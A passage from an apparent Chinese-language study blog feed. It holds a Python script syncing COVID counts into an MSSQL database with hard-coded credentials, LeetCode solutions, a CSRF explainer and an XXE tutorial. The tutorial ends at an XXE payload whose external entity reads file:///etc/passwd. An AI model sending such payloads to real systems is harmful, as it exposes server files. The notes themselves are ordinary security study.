str1.split(&#39;，&#39;)# print(str2)for i in str2:    for key in dict:        if key in i and (i.replace(key, &#39;&#39;)).isnumeric():            dict[key] = dict[key] + int(i.replace(key, &#39;&#39;))print(dict)# endregion# region 四、同步数据库import pymssqlconnect = pymssql.connect(host=&#39;x.x.x.x:xxxx&#39;, user=&#39;team16&#39;, password=&#39;team16&#39;, database=&#39;team16&#39;)  # 远程链接数据库建立连接if connect:    print(&quot;连接成功&quot;)else:    print(&quot;wrong!&quot;)cursor = connect.cursor()  # 创建一个游标对象python里的sql语句都要通过cursor来执行sql = &quot;select * from dbo.C19_State;update dbo.C19_State set sum=0 where 1=1;&quot;  # 查询数据库信息cursor.execute(sql)  # 执行sql语句row1 = cursor.fetchone()  # 读取查询结果sql1 = &#39;&#39;while row1:  # 循环读取所有结果    for key in dict:        if key in row1[3]:            sql1 = sql1 + &#39;update dbo.C19_State set sum=&#123;&#125; where areaName=\&#39;&#123;&#125;\&#39;&#39;.format(dict[key], row1[3]) + &#39;;&#39;    # print(row1[0], row1[1], row1[2], row1[3], row1[4])  # 输出结果    row1 = cursor.fetchone()print(sql1)cursor.execute(sql1)connect.commit()sql = &quot;select * from dbo.C19_State;&quot;  # 查询数据库信息cursor.execute(sql)row2 = cursor.fetchone()  # 读取查询结果while row2:  # 循环读取所有结果    print(row2[0], row2[1], row2[2], row2[3], row2[4],row2[5])  # 输出结果    row2 = cursor.fetchone()connect.close()# endregionif sum:    print(&#39;同步成功&#39;)else:       print(&#39;同步失败&#39;)</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>XPath</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LeetCode</title>
    <link href="/2022/04/10/LeetCode/"/>
    <url>/2022/04/10/LeetCode/</url>
    
    <content type="html"><![CDATA[<p>算法学习</p><span id="more"></span><hr><h2 id="Python数据类型"><a href="#Python数据类型" class="headerlink" title="Python数据类型"></a>Python数据类型</h2><div class="hljs code-wrapper"><pre><code>Number（数字）String（字符串）List（列表）Tuple（元组）Set（集合）Dictionary（字典）不可变数据（3 个）：数字、字符串、元组可变数据（3 个）：列表、字典、集合可变---&gt;数据变化，地址不变---a=b指向同一地址，改变a，b的值也发生变化</code></pre></div><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>列表是写在方括号 [] 之间、用逗号分隔开的元素列表</p><p>列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）</p><p>列表可执行切片操作</p><p>列表可以直接赋值=，改变原值</p><p>可用+连接两个列表</p><div class="hljs code-wrapper"><pre><code>list.append(&#39;&#39;)        向列表添加元素del list[0]            删除列表元素list.count(obj)        统计某个元素在列表中出现的次数list.index(obj)        从列表中找出某个值第一个匹配项的索引位置list.insert(index, obj)        将对象插入列表list.pop([index=-1])    移除列表中的一个元素（默认最后一个元素），并且返回该元素的值list.remove(obj)        移除列表中某个值的第一个匹配项list.reverse()            反向列表中元素list.sort(cmp=None, key=None, reverse=False)    对原列表进行排序</code></pre></div><h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>元组写在小括号 () 里，元素之间用逗号隔开</p><p>1、与字符串一样，元组的元素不能修改<br>2、元组也可以被索引和切片，方法一样<br>3、注意构造包含 0 或 1 个元素的元组的特殊语法规则<br>4、元组也可以使用+操作符进行拼接  </p><h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><p>可以使用大括号 { } 或者 set() 函数创建集合</p><p>注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典</p><p>输出集合，重复的元素被自动去掉</p><p>set可以进行集合运算</p><div class="hljs code-wrapper"><pre><code>a = set(&#39;abracadabra&#39;)b = set(&#39;alacazam&#39;)print(a)print(a - b)     # a 和 b 的差集print(a | b)     # a 和 b 的并集print(a &amp; b)     # a 和 b 的交集print(a ^ b)     # a 和 b 中不同时存在的元素</code></pre></div><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>字典是一种映射类型，字典用 { } 标识，它是一个无序的 键(key) : 值(value) 的集合</p><div class="hljs code-wrapper"><pre><code>dict = &#123;&#125;dict[&#39;one&#39;] = &quot;111111&quot;dict[2]     = &quot;222222&quot;或dict = &#123;&#39;name&#39;: &#39;aaa&#39;,&#39;code&#39;:111, &#39;site&#39;: &#39;www&#39;&#125;</code></pre></div><p>列表是有序的对象集合，字典是无序的对象集合</p><p>两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取</p><p>在同一个字典中，键(key)必须是唯一的</p><p>构造函数 dict() 可以直接从键值对序列中构建字典</p><div class="hljs code-wrapper"><pre><code>dict([(&#39;a&#39;, 1), (&#39;b&#39;, 2), (&#39;c&#39;, 3)])</code></pre></div><hr><h2 id="Python使用数据类型"><a href="#Python使用数据类型" class="headerlink" title="Python使用数据类型"></a>Python使用数据类型</h2><h3 id="栈-stack"><a href="#栈-stack" class="headerlink" title="栈 stack"></a>栈 stack</h3><p>栈只能在一端进行插入和删除操作，它按照先进后出(FILO)的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶</p><div class="hljs code-wrapper"><pre><code>Stack() 创建一个空的新栈。 它不需要参数，并返回一个空栈push(item)将一个新项添加到栈的顶部。它需要 item 做参数并不返回任何内容pop() 从栈中删除顶部项。它不需要参数并返回 item 。栈被修改peek() 从栈返回顶部项，但不会删除它。不需要参数。 不修改栈isEmpty() 测试栈是否为空。不需要参数，并返回布尔值size() 返回栈中的 item 数量。不需要参数，并返回一个整数</code></pre></div><p>使用列表实现栈</p><div class="hljs code-wrapper"><pre><code>list.append(obj)---在列表末尾添加新的对象list.pop()---移除列表最后一个元素，并返回该元素的值list[len(list)-1]---返回列表尾部元素</code></pre></div><hr><h2 id="Python实用函数"><a href="#Python实用函数" class="headerlink" title="Python实用函数"></a>Python实用函数</h2><h3 id="zip"><a href="#zip" class="headerlink" title="zip()"></a>zip()</h3><p>将可迭代的对象组合在一起</p><p>将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的对象</p><div class="hljs code-wrapper"><pre><code>a1=[&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;]a2=[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;]for i in zip(a1,a2):    print(i)===&gt;(&#39;aaa&#39;, &#39;1&#39;)(&#39;bbb&#39;, &#39;2&#39;)(&#39;ccc&#39;, &#39;3&#39;)</code></pre></div><h3 id="zip-1"><a href="#zip-1" class="headerlink" title="zip(*)"></a>zip(*)</h3><p>返回一个元组的迭代器，其中的第 i 个元组包含来自每个参数序列或可迭代对象的第 i 个元素<br>当所输入可迭代对象中最短的一个被耗尽时，迭代器将停止迭代</p><p>当只有一个可迭代对象参数时，它将返回一个单元组的迭代器  </p><p>不带参数时，它将返回一个空迭代器</p><div class="hljs code-wrapper"><pre><code>a1=[&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;]for i in zip(*a1):    print(i)===&gt;(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;)(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;)(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;)</code></pre></div><h3 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h3><p>匿名函数</p><div class="hljs code-wrapper"><pre><code>s=sorted(s,key=lambda x:x[1],reverse=True)lambda x:x[1]lambda的主体是一个表达式，而不是一个代码块</code></pre></div><h1 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h1><h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1.两数之和"></a>1.两数之和</h2><p>给一个数组，再给一个数n<br>从数组中选出两个数a,b相加==n<br>返回两个数的下标</p><p>方法：穷举法</p><div class="hljs code-wrapper"><pre><code>class Solution:    def twoSum(self, nums: List[int], target: int):        for i in range(len(nums)):            for j in range(i+1, len(nums)):                print(j)                if nums[i]+nums[j] == target:                    print(&quot;[&#123;&#125;, &#123;&#125;]&quot;.format(i, j))                    return [i, j]        print(nums)        return nums</code></pre></div><h2 id="7-回文数"><a href="#7-回文数" class="headerlink" title="7.回文数"></a>7.回文数</h2><p>左-&gt;右和右-&gt;左一样的数字  </p><div class="hljs code-wrapper"><pre><code>方法一：按位比较从两头处理字符，先判断数值是否相等，后判断是否到中间位置，再加上特殊情况class Solution:    def isPalindrome(self, x: int) -&gt; bool:        if x &lt; 0:   # &lt;0 是非回文数            return False        a = len(str(x))-1        x1 = str(x)        # print(&quot;数值为0-&#123;&#125;&quot;.format(a))        for i in range(0, a):            print(&quot;下标&#123;0&#125;---&#123;1&#125;&quot;.format(i, a-i))            print(&quot;数值&#123;0&#125;-----&#123;1&#125;&quot;.format(x1[i], x1[a-i]))            if x1[i] == x1[a-i]:    # 判断数值是否相等                if a-i-i &gt; 1:       # 判断是否到达中间值                    continue                else:                    print(&quot;&#123;&#125;是回文数&quot;.format(x1))                    return True            elif x1[i] != x1[a-i]:                print(&quot;&#123;&#125;不是回文数&quot;.format(x1))                return False        print(&quot;&#123;&#125;是回文数&quot;.format(x1))        return True     # return 0-9 ---for i in range(x) [0,x)</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法二：整体比较字符翻转，不进行单个字符的比较Python切片--&gt;反序class SolutionModify:    def isPalindrome(self, x: int) -&gt; bool:        if str(x)[::-1] == str(x):            return True        else:            return False</code></pre></div><h2 id="13-罗马数字转整数"><a href="#13-罗马数字转整数" class="headerlink" title="13.罗马数字转整数"></a>13.罗马数字转整数</h2><p><img src="/2022/04/10/LeetCode/13.png"></p><div class="hljs code-wrapper"><pre><code>方法一：取出特殊值单独计算，然后其他数依次相加class Solution:    def romanToInt(self, s: str) -&gt; int:        s1 = s        d = &#123;&quot;IV&quot;: 4, &quot;IX&quot;: 9, &quot;XL&quot;: 40, &quot;XC&quot;: 90, &quot;CD&quot;: 400, &quot;CM&quot;: 900&#125;        d1 = &#123;&quot;I&quot;: 1, &quot;V&quot;: 5, &quot;X&quot;: 10, &quot;L&quot;: 50, &quot;C&quot;: 100, &quot;D&quot;: 500, &quot;M&quot;: 1000&#125;        sum = 0        for i in d:            if s1.find(i) == -1:                continue            else:                s1 = s1.replace(str(i), &quot;&quot;, 1)                sum = sum + d[i]        for i in s1:            if s1.find(i) != -1:                s1 = s1.replace(i, &#39;&#39;, 1)                sum = sum + d1[i]            else:                continue        # print(sum)        return sum</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法二：从[0][1]开始，取两个数做比较，如果大数在前就做sum+[0]，小数在前就做sum-[0]    class SolutionModify:    def romanToInt(self, s: str) -&gt; int:        map = &#123;&quot;I&quot;: 1, &quot;V&quot;: 5, &quot;X&quot;: 10, &quot;L&quot;: 50, &quot;C&quot;: 100, &quot;D&quot;: 500, &quot;M&quot;: 1000&#125;        sum = 0        mid = s[0]        for i in range(1,len(s)):            if map[mid] &gt;= map[s[i]]:                sum = sum + map[mid]            elif map[mid] &lt; map[s[i]]:                sum = sum - map[mid]            mid = s[i]        sum = sum +map[mid]        return sum</code></pre></div><h2 id="14-最长公共前缀"><a href="#14-最长公共前缀" class="headerlink" title="14.最长公共前缀"></a>14.最长公共前缀</h2><p>ps:我好像在用c的逻辑去写python…太蠢了</p><p>编写一个函数来查找字符串数组中的最长公共前缀  </p><p>如果不存在公共前缀，返回空字符串 “”</p><div class="hljs code-wrapper"><pre><code>方法一：纵向扫描取出每个字符串的每个头字符进行单个比较并删除，若相等则记录，再循环比较当前第一位（实际第二位）字符因未知字符串长度，添加越界报错...class Solution:    def longestCommonPrefix(self, strs: List[str]) -&gt; str:        length = len(strs) - 1        ret = &quot;&quot;        while True:            if strs[0] == &quot;&quot;:                return ret            mid = strs[0][0]            for i in range(length + 1):                # print(&quot;字符串NO.&quot;, i)                try:                    if strs[i][0] == mid:                        strs[i] = strs[i].replace(strs[i][0], &quot;&quot;, 1)                        continue                    else:                        # print(ret)                        return ret                except:                    # print(&quot;+++++++&quot;, ret)                    return ret            ret = ret + mid代码改进：def longestCommonPrefix1(self, strs: List[str]) -&gt; str:    if len(strs) == 0:        return &quot;&quot;    rows, cols = len(strs), len(strs[0])    for i in range(cols):        for j in range(rows):            if len(strs[j]) == i or strs[j][i] != strs[0][i]:                return strs[0][:i]    return strs[0]</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法二：先找出列表中最短的字符串，然后反向比较---从n到0，对每个字符串进行切片比较若不相等，则结果为[n-1:]for i in range 去判断最后return位置class SolutionModify:    def longestCommonPrefix(self, strs: List[str]) -&gt; str:        ret = &quot;&quot;        if &quot;&quot; in strs:            return ret        smallest = strs[0]        minm = len(strs[0])        for s in strs:            if len(s) &lt; minm:                smallest = s  # 取出长度最短的字符串        lth = len(smallest) - 1        for n in range(lth + 1, -1, -1):            for i in range(len(strs)):                if len(strs) == 1:                    return smallest                if strs[i][:n] == smallest[:n]:                    ret = smallest[:n]                elif strs[i][:n] != smallest[:n]:                    break                if i == len(strs) - 1:                    # print(ret)                    return ret        </code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法三：利用python的特性zip(*)遍历每个字符串同下标的字符，将其组成为集合，去重，若该集合长度为1， 则遍历下一个字符，否则return 结果class Solution:    def longestCommonPrefix(self, strs):        res = &quot;&quot;        print(str(zip(*strs)))        for tmp in zip(*strs):            print(&quot;tmp-----&quot;,tmp)            tmp_set = set(tmp)            print(&quot;tmp_set-----&quot;,tmp_set)            if len(tmp_set) == 1:                res += tmp[0]            else:                break        print(res)        return res</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法四：正序取一个单词 s，和后面单词比较，看 s 与每个单词相同的最长前缀是多少遍历所有单词class Solution:    def longestCommonPrefix(self, s: List[str]) -&gt; str:        if not s:            return &quot;&quot;        res = s[0]        i = 1        while i &lt; len(s):            while s[i].find(res) != 0:                res = res[0:len(res)-1] # 给res赋值为res[0:len(res)-1]---&gt;res从尾部去除一个字符            i += 1        return res</code></pre></div><h2 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a>20. 有效的括号</h2><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效  </p><p>有效字符串需满足：</p><div class="hljs code-wrapper"><pre><code>左括号必须用相同类型的右括号闭合 左括号必须以正确的顺序闭合</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法一：栈的思想---用List实现栈先将匹配到的左括号入栈，然后当匹配到右括号时，比较栈顶元素，是否为对应的左括号若是，则栈顶元素出栈，否---return False最后判断栈内的元素个数是否为0class Solution:    def isValid(self, s: str) -&gt; bool:        map1 = &#123;&#39;)&#39;: &#39;(&#39;, &#39;]&#39;: &#39;[&#39;, &#39;&#125;&#39;: &#39;&#123;&#39;&#125;        ss = []        for i in s:            if i in map1.values():                ss.append(i)            if i in map1.keys():                if len(ss) == 0:                    return False                if ss[len(ss)-1] == map1[i]:                    ss.pop()                    continue                else:                    return False        return len(ss) == 0精简---&gt;author:z1mclass Solution:    def isValid(self, s: str) -&gt; bool:        dic = &#123;&#39;)&#39;:&#39;(&#39;,&#39;]&#39;:&#39;[&#39;,&#39;&#125;&#39;:&#39;&#123;&#39;&#125;        stack = []        for i in s:            if stack and i in dic:                if stack[-1] == dic[i]: stack.pop()                else: return False            else: stack.append(i)                return not stack</code></pre></div><h2 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21.合并两个有序链表"></a>21.合并两个有序链表</h2><p>在本地跑不了…</p><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的</p><p>输入：l1 = [1,2,4], l2 = [1,3,4]<br>输出：[1,1,2,3,4,4]</p><div class="hljs code-wrapper"><pre><code>方法一：递归从头开始，判断val，给小数的next赋值，返回小数的节点例：l1=[0,2]l2=[1]l1&lt;l2(0&lt;1)l1.next=merge(2,1)---&gt;l2---&gt;l1merge(2,1)l1&gt;l2(2&gt;1)l2.next=merge(2,null)---&gt;l1return l2merge(2,null)l2 is None return l1l1---&gt;l2---&gt;l10,1,2# Definition for singly-linked list.from typing import Optionalclass ListNode:    def __init__(self, val=0, next=None):        self.val = val        self.next = nextclass Solution:    def mergeTwoLists(self, list1: Optional[ListNode], list2: Optional[ListNode]) -&gt; Optional[ListNode]:        if not list1: return list2        if not list2: return list1        if list1.val &lt; list2.val:            list1.next = self.mergeTwoLists(list1.next, list2)            return list1        else:            list2.next = self.mergeTwoLists(list1, list2.next)            return list2</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法二：迭代设置一个prehead，维护一个prev指针，比较l1和l2，调整prev的next指针，如果 l1 当前节点的值小于等于 l2 ，就把 l1 当前的节点接在 prev 节点的后面同时将 l1 指针往后移一位否则，对 l2 做同样的操作。不管将哪一个元素接在了后面，都需要把 prev 向后移一位 class Solution:    def mergeTwoLists(self, l1: ListNode, l2: ListNode) -&gt; ListNode:        prehead = ListNode(-1)        prev = prehead        while l1 and l2:            if l1.val &lt;= l2.val:                prev.next = l1                l1 = l1.next            else:                prev.next = l2                l2 = l2.next                        prev = prev.next        # 合并后 l1 和 l2 最多只有一个还未被合并完，我们直接将链表末尾指向未合并完的链表即可        prev.next = l1 if l1 is not None else l2        return prehead.next</code></pre></div><h2 id="26-删除有序数组中的重复项"><a href="#26-删除有序数组中的重复项" class="headerlink" title="26. 删除有序数组中的重复项"></a>26. 删除有序数组中的重复项</h2><p>给你一个 升序排列 的数组 nums ，请你 原地 删除重复出现的元素，使每个元素 只出现一次 ，返回删除后数组的新长度。元素的 相对顺序 应该保持 一致 </p><p>由于在某些语言中不能改变数组的长度，所以必须将结果放在数组nums的第一部分。更规范地说，如果在删除重复项之后有 k 个元素，那么 nums 的前 k 个元素应该保存最终结果</p><p>将最终结果插入 nums 的前 k 个位置后返回 k </p><p>不要使用额外的空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成</p><div class="hljs code-wrapper"><pre><code>方法一：穷举...比较前后两数的大小，del 元素class Solution:    def removeDuplicates(self, nums: List[int]) -&gt; int:        i = 0        while i &lt; len(nums) - 1:            if i + 1 == len(nums): break            if nums[i] == nums[i + 1]:                del nums[i + 1]                i = i - 1            i = i + 1        return len(nums)</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法二：双指针解法一个指针 i 进行数组遍历，另外一个指针 j 指向有效数组的最后一个位置只有当 i 所指向的值和 j 不一致（不重复），才将 i 的值添加到 j 的下一位置即覆盖掉nums前面比较过的元素使nums的前部分为所需数组，后部分为原来数组返回j+1，即所需数组的长度，达到解题效果class Solution:    def removeDuplicates(self, nums: List[int]) -&gt; int:        j = 0        for i in range(len(nums)):            if nums[i] != nums[j]:                j+=1            nums[j]=nums[i]        return j+1</code></pre></div><h2 id="27-移除元素"><a href="#27-移除元素" class="headerlink" title="27. 移除元素"></a>27. 移除元素</h2><p>给你一个数组 nums 和一个值 val，你需要 原地 移除所有数值等于 val 的元素，并返回移除后数组的新长度</p><p>不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并 原地 修改输入数组</p><p>元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素</p><div class="hljs code-wrapper"><pre><code>方法一：穷举法找到，删除def removeElement(self, nums: List[int], val: int) -&gt; int:    i = 0    while i &lt; len(nums):        if nums[i] == val:            del nums[i]            if i == 0: continue            else: i -= 1        i += 1    return len(nums)</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法二：双指针解法当没匹配到val时，保持nums[j]=nums[i],当匹配到val，j不变，i++，跳过val所在项所以j的值为元素的个数，即nums的有效部分的长度def removeElement2(self, nums: List[int], val: int) -&gt; int:    j = 0    for i in range(len(nums)):        if nums[i] != val:            nums[j] = nums[i]            j += 1    return j</code></pre></div><h2 id="28-实现-strStr"><a href="#28-实现-strStr" class="headerlink" title="28. 实现 strStr()"></a>28. 实现 strStr()</h2><p>实现 strStr() 函数</p><p>给你两个字符串 haystack 和 needle ，请你在 haystack 字符串中找出 needle 字符串出现的第一个位置（下标从 0 开始）。如果不存在，则返回  -1 </p><div class="hljs code-wrapper"><pre><code>方法一：.........    def strStr(self, haystack: str, needle: str) -&gt; int:        if needle == &quot;&quot;:            return 0        elif needle in haystack:            return haystack.find(needle)        else:            return -1</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法二：暴力破解切片法将 字符串 needle 与字符串 haystack 的所有长度为 len(needle) 的子串均匹配一次    def strStr(self, haystack: str, needle: str) -&gt; int:        if not needle:            return 0        else:            for i in range(len(haystack)):                if i+len(needle) &gt; len(haystack):break                if haystack[i:i+len(needle)] == needle:                    return i        return -1</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>方法三：Knuth-Morris-Pratt 算法</code></pre></div><h2 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a>35. 搜索插入位置</h2><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>请必须使用时间复杂度为 O(log n) 的算法。</p><div class="hljs code-wrapper"><pre><code>from typing import Listclass Solution:    def searchInsert(self, nums: List[int], target: int) -&gt; int:        i = 0        while i &lt; len(nums):            if nums[i] &lt; target:                i += 1                continue            if nums[i] &gt;= target:                return i        return len(nums)</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>class Solution1:    def searchInsert(self, nums: List[int], target: int) -&gt; int:        for i in range(len(nums)):            if nums[i] &gt;= target:                return i        return len(nums)</code></pre></div><h2 id="53-最大子数组和"><a href="#53-最大子数组和" class="headerlink" title="53. 最大子数组和"></a>53. 最大子数组和</h2><p>给你一个整数数组 nums ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和</p><p>子数组 是数组中的一个连续部分</p><div class="hljs code-wrapper"><pre><code>方法一：从头开始相加，结果&lt;0，则sum=0，记录最大和纯负数情况：仅获取最大的负数，设置一个flag遍历，若没有自然数，则return最大负数from typing import Listimport sysclass Solution:    def maxSubArray(self, nums: List[int]) -&gt; int:        sum1, sumLarge, flag = [0, 0, 0]        sumTiny = -sys.maxsize - 1        for i in nums:            # 遍历连续子数组，获取最大值            if sumLarge &lt; 0:                sumLarge = 0            sumLarge = sumLarge + i            if sumLarge &gt; sum1:                sum1 = sumLarge            # 不存在自然数的情况            if i &gt;= 0:                flag = 1            # 获取最大的负数            if i &gt; sumTiny and i &lt; 0:                sumTiny = i        if flag == 1:            return sum1        else:            return sumTiny</code></pre></div><h2 id="58-最后一个单词的长度"><a href="#58-最后一个单词的长度" class="headerlink" title="58. 最后一个单词的长度"></a>58. 最后一个单词的长度</h2><p>给你一个字符串 s，由若干单词组成，单词前后用一些空格字符隔开。返回字符串中 最后一个 单词的长度</p><p>单词 是指仅由字母组成、不包含任何空格字符的最大子字符串</p><div class="hljs code-wrapper"><pre><code>方法一：分割，最后一项的长度class Solution:    def lengthOfLastWord(self, s: str) -&gt; int:        return len(s.split()[-1])</code></pre></div><h2 id="66-加一"><a href="#66-加一" class="headerlink" title="66. 加一"></a>66. 加一</h2><p>给定一个由 整数 组成的 非空 数组所表示的非负整数，在该数的基础上加一</p><p>最高位数字存放在数组的首位， 数组中每个元素只存储单个数字</p><p>你可以假设除了整数 0 之外，这个整数不会以零开头</p><div class="hljs code-wrapper"><pre><code>反向遍历list，找出 第一个不为 9 的元素，将其+1若都为 9 则返回新数组from typing import Listclass Solution:    def plusOne(self, digits: List[int]) -&gt; List[int]:        if digits[-1] == 9:            for i in range(len(digits) - 1, -1, -1):                if i == 0 and digits[i] == 9:                    a = [1, ]                    for j in range(len(digits)):                        a.append(0)                    return a                if digits[i] == 9:                    digits[i] = 0                    continue                else:                    digits[i] += 1                    break        else:            digits[-1] += 1        return digitsa = Solution()b = [8, 9, 9, 9]a.plusOne(b)简便写法：反向遍历，判断当前值是否为 9 ，是则0，否+1 return（这样就不用对 全为9 的情况再进行具体编码）class Solution:    def plusOne(self, digits: List[int]) -&gt; List[int]:        for i in range(len(digits) - 1, -1, -1):            if digits[i] == 9:                digits[i] = 0            else:                digits[i] += 1                return digits        a = [0] * len(digits)        a.insert(0, 1)        return a</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF跨站请求伪造</title>
    <link href="/2022/03/25/csrf/"/>
    <url>/2022/03/25/csrf/</url>
    
    <content type="html"><![CDATA[<p>CSRF跨站请求伪造 学习记录</p><span id="more"></span><h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><p>CSRF（Cross-site request forgery）跨站请求伪造，是一种常见的web安全漏洞，概括地说就是指，攻击者通过浏览器保存的Cookie盗用了你的身份，以你的名义给某个网站发送恶意请求，这些恶意请求包括但不限于发邮件、修改账户信息、购买商品、转账等等，从而泄露了个人的隐私安全和财产安全</p><h1 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h1><p>浏览并登录受信网站WebA<br>验证通过，浏览器端产生WebA的cookie<br>用户在没有登出WebA的前提下访问了危险网站Web<br>Web发出一个对WebA的恶意请求<br>根据4中的请求，浏览器带着还未失效的cookie访问WebA<br>WebA并不知道该请求是用户发出的还是WebB发出的，当权限校验通过后，WebB就达到了模拟用户操作的目的 </p><p><a href="https://www.cnblogs.com/bin1121/p/12464266.html">https://www.cnblogs.com/bin1121/p/12464266.html</a></p><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><p>（1）验证 HTTP Referer 字段</p><p>（2）在请求地址中添加 token 并验证</p><p>（3）在 HTTP 头中自定义属性并验证</p>]]></content>
    
    
    
    <tags>
      
      <tag>web csrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE -- XML外部实体注入</title>
    <link href="/2022/03/24/xxe/"/>
    <url>/2022/03/24/xxe/</url>
    
    <content type="html"><![CDATA[<p>对于XXE - xml外部实体注入的学习</p><span id="more"></span><h1 id="XXE-XML外部实体注入"><a href="#XXE-XML外部实体注入" class="headerlink" title="XXE - XML外部实体注入"></a>XXE - XML外部实体注入</h1><p>XML External Entity Injection</p><p>简单说，</p><p>XML 文件在引用外部实体时候,可以沟通构造恶意内容,可以导致读取任意文件,命令执行和对内网的攻击,这就是XXE漏洞</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言</p><div class="hljs code-wrapper"><pre><code>XML被设计为传输和存储数据，其焦点是数据的内容HTML被设计用来显示数据，其焦点是数据的外观XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具</code></pre></div><p>两个采用不同技术的系统可以通过XML进行通信和交换数据</p><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用</p><h3 id="XML基本语法"><a href="#XML基本语法" class="headerlink" title="XML基本语法"></a>XML基本语法</h3><ul><li><p>所有 XML 元素都须有关闭标签</p></li><li><p>XML 标签对大小写敏感</p></li><li><p>XML 必须正确地嵌套</p></li><li><p>XML 文档必须有根元素</p></li><li><p>XML 的属性值须加引号</p></li><li><p>在 XML 中，空格会被保留，多个空格不会被合并为一个</p></li></ul><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块</p><p>它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用</p><div class="hljs code-wrapper"><pre><code>内部声明DTD&lt;!DOCTYPE 根元素 [元素声明]&gt;引用外部DTD&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;或者&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></pre></div><h3 id="DTD实体—漏洞原理"><a href="#DTD实体—漏洞原理" class="headerlink" title="DTD实体—漏洞原理"></a>DTD实体—漏洞原理</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</p><p>实体引用是对实体的引用</p><p>实体可以在内部或外部进行声明</p><p>内部实体</p><div class="hljs code-wrapper"><pre><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note[&lt;!ELEMENT note (name)&gt;&lt;!ENTITY hack3r &quot;Hu3sky&quot;&gt;]&gt;&lt;note&gt;&lt;name&gt;&amp;hack3r;&lt;/name&gt;&lt;/note&gt;</code></pre></div><p>按实体有无参分类，实体分为一般实体和参数实体</p><p>一般实体的声明</p><div class="hljs code-wrapper"><pre><code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code></pre></div><p>引用一般实体的方法</p><div class="hljs code-wrapper"><pre><code>&amp;实体名称;</code></pre></div><p>外部实体</p><div class="hljs code-wrapper"><pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</code></pre></div><p>参数实体</p><div class="hljs code-wrapper"><pre><code>&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt;</code></pre></div><p>参数实体+外部实体</p><div class="hljs code-wrapper"><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;    